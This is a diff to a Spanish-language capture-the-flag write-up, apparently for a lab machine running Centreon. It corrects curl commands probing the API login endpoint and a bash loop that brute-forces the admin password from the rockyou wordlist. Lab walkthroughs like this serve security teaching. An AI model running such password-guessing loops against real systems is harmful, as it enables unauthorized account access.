@@ -57,9 +57,7 @@ No se puede bruteforcear por:
 Si buscas en google centreon api te sale como busqeda sugerida "login", lo que te da la documentacion [oficial](https://docs.centreon.com/docs/api/rest-api-v1/)
 
 ```console
-└─$ curl -s -X POST /api/index.php?action=authenticate -d "{'username': 'test', 'password': 'test'}"
-# Bad parameters
-└─$ curl -s -X POST http://10.10.10.157/centreon/api/index.php?action=authenticate -d "username=test&password=test"
+└─$ curl -s -X POST http://10.10.10.157/centreon/api/index.php?action=authenticate -d "{'username': 'test', 'password': 'test'}"
 # Bad parameters
 └─$ curl -s -X POST http://10.10.10.157/centreon/api/index.php?action=authenticate -d "username=test&password=test"
 "Bad credentials"
@@ -73,8 +71,7 @@ Si no disponemos de curl, bash tiene también sus herramientas (y tambien python
 ```bash
 for i in $(cat /usr/share/wordlists/rockyou.txt); do
     echo -n "$i: "
-    curl -s -X POST http://10.10.10.157/centreon/api/index.php?action=authenticate -d "username=admin&passwor
-d=$i"
+    curl -s -X POST http://10.10.10.157/centreon/api/index.php?action=authenticate -d "username=admin&password=$i"
     echo
 done
 ```
